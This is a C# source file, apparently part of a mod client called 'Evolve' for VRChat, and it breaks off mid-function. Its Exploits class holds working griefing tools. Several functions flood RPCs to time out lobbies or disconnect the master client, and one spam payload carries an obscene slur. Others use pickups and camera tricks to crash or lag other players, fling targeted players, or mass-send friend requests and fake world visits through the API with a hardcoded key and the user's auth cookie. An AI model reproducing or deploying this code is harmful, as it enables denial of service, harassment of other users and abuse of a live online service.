using Evolve.Bot;
using Evolve.Buttons;
using Evolve.ConsoleUtils;
using Evolve.Patch;
using Evolve.Utils;
using Evolve.Wrappers;
using ExitGames.Client.Photon;
using Harmony;
using MelonLoader;
using Photon.Pun;
using RootMotion.FinalIK;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using UnhollowerBaseLib;
using UnityEngine;
using VRC;
using VRC.Core;
using VRC.SDK.Internal.MeetingBunker.VRC_Presentation_Utils;
using VRC.SDK3.Components;
using VRC.SDKBase;
using VRC.Udon;
using VRC.Udon.Common.Interfaces;
using VRC.UserCamera;
using VRCSDK2;
using static VRC.SDKBase.VRC_EventHandler;
using Resources = UnityEngine.Resources;
using Utilities = Evolve.Utils.Utilities;
using VRC_EventHandler = VRC.SDKBase.VRC_EventHandler;
using VRC_Pickup = VRCSDK2.VRC_Pickup;
using VRC_SpecialLayer = VRCSDK2.VRC_SpecialLayer;
using VRC_Trigger = VRCSDK2.VRC_Trigger;

namespace Evolve.Exploits
{
    internal class Exploits
    {
        public static List<VRC_Pickup> AllPickups = new List<VRC_Pickup>();
        public static List<VRCPickup> AllUdonPickups = new List<VRCPickup>();
        public static List<VRC_Trigger> AllTriggers = new List<VRC_Trigger>();
        public static List<VRC_ObjectSync> AllSyncPickups = new List<VRC_ObjectSync>();
        public static VRC_EventHandler handler;
        public static Il2CppArrayBase<UdonBehaviour> Behaviours;
#pragma warning disable CS0649 // Le champ 'Exploits.VideoPlayer' n'est jamais assigné et aura toujours sa valeur par défaut null
        public static VRC_SyncVideoPlayer VideoPlayer;
#pragma warning restore CS0649 // Le champ 'Exploits.VideoPlayer' n'est jamais assigné et aura toujours sa valeur par défaut null

        public static string[] WorldArray;
        public static bool WorldTravel = false;

        public static void SendUdonRPC(GameObject Object, string EventName, Player Target = null, bool Local = false)
        {
            if (Object != null)
            {
                var Behaviour = Object.GetComponent<UdonBehaviour>();
                if (Target != null)
                {
                    Networking.SetOwner(Target.field_Private_VRCPlayerApi_0, Object);
                    Behaviour.SendCustomNetworkEvent(NetworkEventTarget.Owner, EventName);
                }
                else
                {
                    if (!Local) Behaviour.SendCustomNetworkEvent(NetworkEventTarget.All, EventName);
                    else Behaviour.SendCustomEvent(EventName);
                }
            }
            else
            {
                foreach (var Behaviour in Behaviours)
                {
                    if (Behaviour._eventTable.ContainsKey(EventName)) Behaviour.SendCustomNetworkEvent(NetworkEventTarget.All, EventName);
                }
            }
        }

        public static List<string> FriendList;

        public static IEnumerator BlankUspeakThing()
        {
            float SendUSpeak = 0f;
            while (Settings.USpeakExploit)
            {
                yield return new WaitForSeconds(0.1f);
                try
                {
                    SendUSpeak += 1f;
                    Networking.RPC((RPC.Destination)8, Wrappers.Utils.LocalPlayer.gameObject, "ReloadAvatarNetworkedRPC", null);
                    USpeaker.Method_Public_Static_USpeaker_Object_0(Serialize.ByteArrayToObjectUnity2(Serialize.GetByteArray(72)));
                    if (SendUSpeak > 5000f)
                    {
                        SendUSpeak = 0f;
                        USpeaker.Method_Public_Static_USpeaker_Object_0(Serialize.ByteArrayToObjectUnity2(Serialize.GetByteArray(1000)));
                    }
                }
                catch { }
            }
            yield break;
        }


        public static IEnumerator MaxVelocity()
        {
            float DefaultVelocity = 0f;
            float DefaultBoost = 0f;

            while (Settings.MaxVelocity)
            {
                yield return new WaitForEndOfFrame();
                foreach (var Pickup in AllPickups)
                {
                    if (DefaultVelocity == 0) DefaultVelocity = Pickup.ThrowVelocityBoostMinSpeed;
                    if (DefaultBoost == 0) DefaultVelocity = Pickup.ThrowVelocityBoostScale;
                    if (Pickup.ThrowVelocityBoostMinSpeed != float.MaxValue) Pickup.ThrowVelocityBoostMinSpeed = float.MaxValue;
                    if (Pickup.ThrowVelocityBoostScale != float.MaxValue) Pickup.ThrowVelocityBoostScale = float.MaxValue;
                }

                foreach (var Pickup in AllUdonPickups)
                {
                    if (DefaultVelocity == 0) DefaultVelocity = Pickup.ThrowVelocityBoostMinSpeed;
                    if (DefaultBoost == 0) DefaultVelocity = Pickup.ThrowVelocityBoostScale;
                    if (Pickup.ThrowVelocityBoostMinSpeed != float.MaxValue) Pickup.ThrowVelocityBoostMinSpeed = float.MaxValue;
                    if (Pickup.ThrowVelocityBoostScale != float.MaxValue) Pickup.ThrowVelocityBoostScale = float.MaxValue;
                }
            }

            foreach (var Pickup in AllPickups)
            {
                if (Pickup.ThrowVelocityBoostMinSpeed != float.MaxValue) Pickup.ThrowVelocityBoostMinSpeed = float.MaxValue;
                if (Pickup.ThrowVelocityBoostScale != float.MaxValue) Pickup.ThrowVelocityBoostScale = float.MaxValue;
            }

            foreach (var Pickup in AllUdonPickups)
            {
                if (Pickup.ThrowVelocityBoostMinSpeed != float.MaxValue) Pickup.ThrowVelocityBoostMinSpeed = DefaultVelocity;
                if (Pickup.ThrowVelocityBoostScale != float.MaxValue) Pickup.ThrowVelocityBoostScale = DefaultBoost;
            }
            yield break;
        }


        public static IEnumerator PickupDistance()
        {
            while (Settings.LongDistancePickups)
            {
                yield return new WaitForSeconds(1);

                if (AllPickups != null)
                {
                    foreach (var Pickup in AllPickups)
                    {
                        Pickup.proximity = 99999;
                    }
                }

                if (AllUdonPickups != null)
                {
                    foreach (var Pickup in AllUdonPickups)
                    {
                        Pickup.proximity = 99999;
                    }
                }
            }
            yield break;
        }

        public static IEnumerator ForceInteractPickups()
        {
            while (Settings.ForceInteractPickups)
            {
                foreach (var Pickup in AllPickups)
                {
                    if (!Pickup.pickupable) Pickup.pickupable = true;
                }

                foreach (var Pickup in AllUdonPickups)
                {
                    if (!Pickup.pickupable) Pickup.pickupable = true;
                }

                yield return new WaitForSeconds(1);
            }
            yield break;
        }

        public static IEnumerator PickupSteal()
        {
            while (Settings.PickupSteal)
            {
                yield return new WaitForSeconds(1);

                if (AllPickups != null)
                {
                    foreach (var Pickup in AllPickups)
                    {
                        Pickup.DisallowTheft = false;
                    }
                }

                if (AllUdonPickups != null)
                {
                    foreach (var Pickup in AllUdonPickups)
                    {
                        Pickup.DisallowTheft = false;
                    }
                }
            }
            yield break;
        }


        public static async Task FriendEveryone(string AuthCookie)
        {
            if (File.Exists("Evolve/FriendList.txt")) FriendList = File.ReadAllLines("Evolve/FriendList.txt").ToList<string>();
            var AuthToken = AuthCookie.Trim();
            EvoConsole.LogSuccess($"Logged to the API with: {AuthToken}");
            foreach (var Friend in FriendList)
            {
                if (!APIUser.CurrentUser.friendIDs.Contains(Friend))
                {
                    var handler = new HttpClientHandler
                    {
                        UseCookies = false
                    };

                    var httpClient = new HttpClient(handler);

                    var request = new HttpRequestMessage();
                    {
                        request.Headers.Add("User-Agent", "Other");
                        request.Method = new HttpMethod("POST");
                        request.RequestUri = new Uri($"https://api.vrchat.cloud/api/1/user/{Friend}/friendRequest?apiKey=JlE5Jldo5Jibnk5O5hTx6XVqsJu4WJ26");
                    }

                    request.Headers.TryAddWithoutValidation("Cookie", "auth=" + AuthToken);
                    var response = await httpClient.SendAsync(request);
                    string content = await response.Content.ReadAsStringAsync();
                    if (content.ToLower().Contains("error"))
                    {
                        EvoConsole.LogWarn($"Couldn't add: {Friend}");
                        EvoConsole.LogError(content);
                    }
                    else
                    {
                        EvoConsole.LogSuccess($"Added: {Friend}");
                       // FriendList.Remove(Friend);
                        await Task.Delay(1000);
                    }
                }
                else EvoConsole.LogWarn($"{Friend} is already your friend.");
            }
        }

        public static IEnumerator RankExploit()
        {
            if (WorldArray == null && File.Exists("Evolve\\World.txt")) WorldArray = File.ReadAllLines("Evolve\\World.txt");
            else yield break;
            while (true)
            {
                if (WorldTravel && WorldArray != null)
                {
                    for (int I = 0; I < 10; I++)
                    {
                        string World = WorldArray[new System.Random().Next(0, WorldArray.Length - 1)];
                        int RandString = new System.Random().Next(0, 10000);
                        Join(World, $"{RandString}");
                    }
                }
                yield return new WaitForEndOfFrame();
            }
        }

        public static void Join(string WorldID, string InstanceID)
        {
            Il2CppSystem.Collections.Generic.Dictionary<string, Il2CppSystem.Object> DickTionary = new Il2CppSystem.Collections.Generic.Dictionary<string, Il2CppSystem.Object>();
            DickTionary.Add("userId", APIUser.CurrentUser.id);
            DickTionary.Add("worldId", $"{WorldID}:{InstanceID}");
            API.SendPutRequest("joins", null, DickTionary, null);
            API.SendPutRequest("visits", null, DickTionary, null);
        }


        public static void YeetPlayer(VRCPlayer Target)
        {
            List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            List<VRCPickup> AllUdonPickups = UnityEngine.Object.FindObjectsOfType<VRCPickup>().ToList<VRCPickup>();
            List<VRC_ObjectSync> AllSyncObjects = UnityEngine.Object.FindObjectsOfType<VRC_ObjectSync>().ToList<VRC_ObjectSync>();
            if (AllSyncObjects != null)
            {
                foreach (var Pickup in AllSyncObjects)
                {
                    Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                    for (int i = 0; i < 90; i++)
                    {
                        Pickup.transform.position = Target.transform.position;
                        Pickup.transform.rotation = Quaternion.Euler(0, 0, 0);
                        Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, Pickup.gameObject);
                        Pickup.transform.position += Pickup.transform.up * 10;
                    }
                    Pickup.gameObject.transform.position = new Vector3(Pickup.transform.position.x, Vector3.positiveInfinity.y, Pickup.transform.rotation.z);
                }
            }
        }

        public static bool ShouldGoUp = false;
        public static IEnumerator WaitStuff()
        {
            yield return new WaitForSeconds(2);
            ShouldGoUp = true;
        }
        internal static IEnumerator SendToMoon(VRCPlayer Target)
        {
            List<VRC_Pickup> SDK2Pickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            List<VRCPickup> UdonPickups = UnityEngine.Object.FindObjectsOfType<VRCPickup>().ToList<VRCPickup>();
            List<VRC_ObjectSync> SyncPickups = UnityEngine.Object.FindObjectsOfType<VRC_ObjectSync>().ToList<VRC_ObjectSync>();
            TakeOwnerShip();
            float ypos = -1f;
            ShouldGoUp = false;
            MelonCoroutines.Start(WaitStuff());
            while (Settings.SendToMoon)
            {
                yield return new WaitForEndOfFrame();
                for (int I = 0; I < 15; I++)
                {
                    try
                    {
                        if (SDK2Pickups != null)
                        {
                            foreach (var Pikcup in SDK2Pickups)
                            {
                                Pikcup.transform.position = new Vector3(Target.transform.position.x, ypos, Target.transform.position.z);
                            }
                            if (ShouldGoUp) ypos += 0.01f;
                        }

                        else if (UdonPickups != null)
                        {
                            foreach (var Pikcup in UdonPickups)
                            {
                                Pikcup.transform.position = new Vector3(Target.transform.position.x, ypos, Target.transform.position.z);
                            }
                            if (ShouldGoUp) ypos += 0.01f;
                        }

                        else if (SyncPickups != null)
                        {
                            foreach (var Pikcup in SyncPickups)
                            {
                                Pikcup.transform.position = new Vector3(Target.transform.position.x, ypos, Target.transform.position.z);
                            }
                            if (ShouldGoUp) ypos += 0.01f;
                        }
                    }
                    catch { }
                }
            }
            yield break;
        }
        public static IEnumerator TimeoutLobby()
        {
            while (true)
            {
                if (Settings.LobbyTimout)
                {
                    try
                    {
                        if (handler == null) handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
                        for (int I = 0; I <13; I++)
                        {
                            SendRPC(VrcEventType.SendRPC, "SendRPC", handler.gameObject, int.MaxValue, float.MinValue, $"Wenga gave me this, Day is gay and I fuck both of them <3 {Utils.Utilities.RandomString(5)}", VrcBooleanOp.Unused, VrcBroadcastType.AlwaysUnbuffered, new Il2CppStructArray<byte>(2047L));
                        }
                    }
                    catch { }
                    yield return new WaitForSeconds(1);
                }
                yield return new WaitForEndOfFrame();
            }
        }

        public static IEnumerator TakeOwnerShip()
        {
            List<VRC_Pickup> AllPickups1 = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            List<VRCPickup> AllPickups2 = UnityEngine.Object.FindObjectsOfType<VRCPickup>().ToList<VRCPickup>();
            List<VRC_ObjectSync> AllPickups3 = UnityEngine.Object.FindObjectsOfType<VRC_ObjectSync>().ToList<VRC_ObjectSync>();
            if (AllPickups1 != null)
            {
                for (int x = 0; x < AllPickups1.Count(); x++)
                {
                    yield return new WaitForSeconds(0.3f);
                    var OnePickup = AllPickups1[x];
                    Functions.TakeOwnershipIfNecessary(OnePickup.gameObject);
                    OnePickup.Drop();
                }
            }
            else if (AllPickups2 != null)
            {
                for (int x = 0; x < AllPickups2.Count(); x++)
                {
                    yield return new WaitForSeconds(0.3f);
                    var OnePickup = AllPickups2[x];
                    Functions.TakeOwnershipIfNecessary(OnePickup.gameObject);
                    OnePickup.Drop();
                }
            }
            else if (AllPickups3 != null)
            {
                for (int x = 0; x < AllPickups3.Count(); x++)
                {
                    yield return new WaitForSeconds(0.3f);
                    var OnePickup = AllPickups3[x];
                    Functions.TakeOwnershipIfNecessary(OnePickup.gameObject);
                }
            }
        }

        public static void VideoClap()
        {
            string url = $"https://www.youtube.com/watch?v=DsUYB_aFjn0";
            foreach (VRC_SyncVideoPlayer vrc_SyncVideoPlayer in UnityEngine.Object.FindObjectsOfType<VRC_SyncVideoPlayer>())
            {
                if (vrc_SyncVideoPlayer != null)
                {
                    Networking.LocalPlayer.TakeOwnership(vrc_SyncVideoPlayer.gameObject);
                    vrc_SyncVideoPlayer.Stop();
                    vrc_SyncVideoPlayer.Clear();
                    vrc_SyncVideoPlayer.AddURL(url);
                    vrc_SyncVideoPlayer.Next();
                    vrc_SyncVideoPlayer.Play();
                }
            }
            foreach (VRC_SyncVideoPlayer vrc_SyncVideoPlayer2 in UnityEngine.Object.FindObjectsOfType<VRC_SyncVideoPlayer>())
            {
                if (vrc_SyncVideoPlayer2 != null)
                {
                    Networking.LocalPlayer.TakeOwnership(vrc_SyncVideoPlayer2.gameObject);
                    vrc_SyncVideoPlayer2.Stop();
                    vrc_SyncVideoPlayer2.Clear();
                    vrc_SyncVideoPlayer2.AddURL(url);
                    vrc_SyncVideoPlayer2.Next();
                    vrc_SyncVideoPlayer2.Play();
                }
            }
        }

        public static IEnumerator FreeFallPickups()
        {
            while (VRCPlayer.field_Internal_Static_VRCPlayer_0 == true)
            {
                
            }
            yield break;
        }

        public static IEnumerator SpawnBugPortal(string ID, Vector3 position, Quaternion rotation, Vector3 size)
        {
            while (Settings.FreeFall)
            {
                yield return new WaitForSeconds(0.3f);
                try
                {
                    GameObject gameObject = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", position, rotation);
                    Networking.RPC(RPC.Destination.AllBufferOne, gameObject, "ConfigurePortal", new Il2CppSystem.Object[]
                    {
                (String) ID,
                (String) "1337",
                new Il2CppSystem.Int32 { m_value = 4 }.BoxIl2CppObject()
                    });
                    gameObject.GetComponent<BoxCollider>().size = size;
                }
                catch { }
            }
            yield break;
        }

        public static IEnumerator DisconnectMaster()
        {
            handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
            while (Settings.DisconnectMaster)
            {
                yield return new WaitForSeconds(0.9f);
                for (int I = 0; I < 14; I++)
                {
                    SendRPC(VrcEventType.SendRPC, "SendRPC", handler.gameObject, 1, 0, Utils.Utilities.RandomString(500), VrcBooleanOp.Unused, VrcBroadcastType.Always);
                }
            }
            yield break;
        }

        public static IEnumerator FramesDropping()
        {
            while (true)
            {
                if (Settings.EmoteLag && VRCPlayer.field_Internal_Static_VRCPlayer_0 == true)
                {
                    for (int i = 0; i < 6; i++)
                    {
                        int ID = -Utils.Utilities.RandomNumber(6);
                        Functions.EmoteRPC(ID);
                        Functions.EmojiRPC(ID);
                    }
                }
                yield return new WaitForEndOfFrame();
            }
        }
        public static IEnumerator ItemCrash(Player Player)
        {
            while (true)
            {
                if (!Settings.ItemCrash) yield break;

                List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
                List<VRCPickup> AllUdonPickups = UnityEngine.Object.FindObjectsOfType<VRCPickup>().ToList<VRCPickup>();
                List<VRC_Trigger> AllTriggers = UnityEngine.Object.FindObjectsOfType<VRC_Trigger>().ToList<VRC_Trigger>();

                if (AllTriggers != null)
                {
                    foreach (var Trigger in AllTriggers)
                    {
                        if (Trigger.HasPickupTriggers)
                        {
                            Functions.TakeOwnershipIfNecessary(Trigger.gameObject);
                            Trigger.TakesOwnershipIfNecessary.ToString();
                            Trigger.Interact();
                        }
                    }
                }

                if (AllPickups != null)
                {
                    foreach (var Pickup in AllPickups)
                    {
                        Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                        Pickup.pickupable = true;
                        Pickup.ThrowVelocityBoostMinSpeed = int.MaxValue;
                        Pickup.ThrowVelocityBoostScale = int.MaxValue;
                        Pickup.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                    }
                    yield return new WaitForSeconds(7f);
                    foreach (var Pickup in AllPickups)
                    {
                        Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                        Pickup.pickupable = true;
                        Pickup.ThrowVelocityBoostMinSpeed = int.MaxValue;
                        Pickup.ThrowVelocityBoostScale = int.MaxValue;
                        Pickup.transform.position = Player.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.Head);
                    }
                    yield return new WaitForSeconds(8f);
                }

                else if (AllUdonPickups != null)
                {
                    foreach (var Pickup in AllUdonPickups)
                    {
                        Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                        Pickup.pickupable = true;
                        Pickup.ThrowVelocityBoostMinSpeed = int.MaxValue;
                        Pickup.ThrowVelocityBoostScale = int.MaxValue;
                        Pickup.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                    }
                    yield return new WaitForSeconds(7f);
                    foreach (var Pickup in AllUdonPickups)
                    {
                        Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                        Pickup.pickupable = true;
                        Pickup.ThrowVelocityBoostMinSpeed = int.MaxValue;
                        Pickup.ThrowVelocityBoostScale = int.MaxValue;
                        Pickup.transform.position = Player.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.Head);
                    }
                    yield return new WaitForSeconds(8f);
                }
            }
        }

        public static IEnumerator PenCrash()
        {
            while (true)
            {
                if (Settings.PenCrash)
                {
                    yield return new WaitForSeconds(1);
                    try
                    {
                        List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
                        if (AllPickups != null)
                        {
                            foreach (var Pickup in AllPickups)
                            {
                                foreach (var PenName in PenNames)
                                {
                                    if (Pickup.name.ToLower().Contains(PenName) && !Pickup.transform.parent.name.ToLower().Contains("eraser"))
                                    {
                                        for (int i = 0; i < 60; i++)
                                        {
                                            var BaseTriger = Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>();
                                            var SDK2Trigger = Pickup.gameObject.GetComponent<VRCSDK2.VRC_Trigger>();
                                            Pickup.Drop();
                                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnDrop();
                                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickup();
                                            if (BaseTriger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown();
                                            if (SDK2Trigger != null) Pickup.gameObject.GetComponent<VRC.SDKBase.VRC_Trigger>().OnPickupUseDown();
                                            Pickup.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue) * 268;
                                            Pickup.transform.position = new Vector3(int.MinValue, int.MinValue, int.MinValue) * 268;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }
                yield return new WaitForEndOfFrame();
            }
        }

        public static void SendRPC(VrcEventType EventType, string Name, GameObject ParamObject, int Int, float Float, string String, VrcBooleanOp Bool, VrcBroadcastType BroadcastType, Il2CppStructArray<byte> Byte = null)
        {
            if (handler == null)
            {
                handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
            }

            VrcEvent a = new VrcEvent
            {
                EventType = EventType,
                Name = Name,
                ParameterObject = ParamObject,
                ParameterInt = Int,
                ParameterFloat = Float,
                ParameterString = String,
                ParameterBoolOp = Bool,
                ParameterBytes = Byte,
            };
            handler.TriggerEvent(a, BroadcastType, ParamObject, 0f);
        }

   

        public static List<string> UserID = new List<string>();
        public static List<string> UserID2 = new List<string>();

        public static void SpamPrefabs()
        {
            foreach (var Player in Wrappers.Utils.PlayerManager.GetAllPlayers())
            {
                foreach (var Prefab in NetworkingExtension.GetDynamicPrefabs())
                {
                    NetworkingExtension.SpawnObject(Prefab.name);
                }
            }
        }
     

        public static void CrashExploit()
        {
            UserCameraController Camera = UserCameraController.field_Internal_Static_UserCameraController_0;
            Camera.field_Private_UserCameraMode_0 = UserCameraMode.Photo;
            Camera.field_Internal_UserCameraIndicator_0.field_Public_AudioSource_0.enabled = true;
            Camera.field_Private_Single_0 = -999;
            Camera.StartCoroutine(Camera.Method_Private_IEnumerator_Int32_PDM_0(-1));
            Camera.field_Private_UserCameraMode_0 = UserCameraMode.Off;
        }

        public static IEnumerator SpamMirrors()
        {
            while (Settings.SpamMirror)
            {
                foreach (VRC_Trigger Trigger in AllTriggers)
                {
                    if (Trigger.name.ToLower().Contains("mirror") || Trigger.transform.parent.name.ToLower().Contains("mirror"))
                    {
                        Functions.TakeOwnershipIfNecessary(Trigger.gameObject);
                        Trigger.Interact();
                    }
                }
                yield return new WaitForSeconds(0.1f);
            }
            yield break;
        }

        public static int CurrentEmoji = 0;
        public static int CurrentEmoji2 = 19;
        public static float delayÉmojiMirrors = 0f;
        public static bool RandomEmojiSpam = true;
        public static bool CustomEmojiSpam = false;
        public static System.Random Random = new System.Random();

        public static void EmojiSpam()
        {
            try
            {
                delayÉmojiMirrors += Time.deltaTime;
                bool flag5 = delayÉmojiMirrors >= 3f;
                if (flag5)
                {
                    int i = RandomEmojiSpam ? Random.Next(0, 57) : (CustomEmojiSpam ? CurrentEmoji2 : CurrentEmoji);
                    Functions.EmojiRPC(i);
                    bool flag6 = CurrentEmoji < 57;
                    if (flag6)
                    {
                        CurrentEmoji++;
                    }
                    else
                    {
                        CurrentEmoji = 0;
                    }
                    delayÉmojiMirrors = 0f;
                }
            }
            catch
            {
            }
        }

        public static IEnumerator LobbyLag()
        {
            List<VRC_Pickup> AllPickups = UnityEngine.Object.FindObjectsOfType<VRC_Pickup>().ToList<VRC_Pickup>();
            List<VRCPickup> AllUdonPickups = UnityEngine.Object.FindObjectsOfType<VRCPickup>().ToList<VRCPickup>();
            List<VRC_ObjectSync> AllSyncPickups = UnityEngine.Object.FindObjectsOfType<VRC_ObjectSync>().ToList<VRC_ObjectSync>();
            for (int i = 0; i < 40; i++)
            {
                if (AllPickups != null && AllPickups.Count > 5)
                {
                    foreach (var Pickup in AllPickups)
                    {
                        if (Pickup.GetComponent<Rigidbody>() != null)
                        {
                            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
                            Pickup.GetComponent<Rigidbody>().useGravity = true;
                            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
                            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
                            Pickup.GetComponent<Rigidbody>().isKinematic = false;
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
                            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                            Pickup.ThrowVelocityBoostMinSpeed = int.MaxValue;
                            Pickup.ThrowVelocityBoostScale = int.MaxValue;
                        }
                        for (int x = 0; x < 2; x++)
                        {
                            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                            Pickup.gameObject.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                            Pickup.ThrowVelocityBoostMinSpeed = int.MaxValue;
                            Pickup.ThrowVelocityBoostScale = int.MaxValue;
                            yield return new WaitForSeconds(0.008f);
                            Pickup.gameObject.transform.position = new Vector3(0, 0.2f, 0);
                        }
                    }
                }
                else if (AllUdonPickups != null && AllUdonPickups.Count > 5)
                {

                    foreach (var Pickup in AllUdonPickups)
                    {
                        if (Pickup.GetComponent<Rigidbody>() != null)
                        {
                            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
                            Pickup.GetComponent<Rigidbody>().useGravity = true;
                            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
                            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
                            Pickup.GetComponent<Rigidbody>().isKinematic = false;
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
                            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                            Pickup.ThrowVelocityBoostMinSpeed = int.MaxValue;
                            Pickup.ThrowVelocityBoostScale = int.MaxValue;
                        }
                        for (int x = 0; x < 2; x++)
                        {
                            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                            Pickup.gameObject.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                            Pickup.ThrowVelocityBoostMinSpeed = int.MaxValue;
                            Pickup.ThrowVelocityBoostScale = int.MaxValue;
                            yield return new WaitForSeconds(0.008f);
                            Pickup.gameObject.transform.position = new Vector3(0, 0.2f, 0);
                        }
                    }
                }
                else if (AllSyncPickups != null && AllSyncPickups.Count > 5)
                {
                    foreach (var Pickup in AllSyncPickups)
                    {
                        if (Pickup.GetComponent<Rigidbody>() != null)
                        {
                            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
                            Pickup.GetComponent<Rigidbody>().useGravity = true;
                            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
                            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
                            Pickup.GetComponent<Rigidbody>().isKinematic = false;
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
                            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
                            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                        }
                        for (int x = 0; x < 2; x++)
                        {
                            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
                            Pickup.gameObject.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                            yield return new WaitForSeconds(0.008f);
                            Pickup.gameObject.transform.position = new Vector3(0, 0.2f, 0);
                        }
                    }
                }
                else
                {
                    Wrappers.Utils.VRCUiPopupManager.ShowAlert("Evolve Engine", "Require at least 6 pickups");
                    yield break;
                }
                yield return new WaitForSeconds(0.5f);
            }
        }

        #region Pickup Lag/Crash

        public static IEnumerator Collapse(VRCPickup Pickup, int HowMuchTime)
        {
            Functions.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
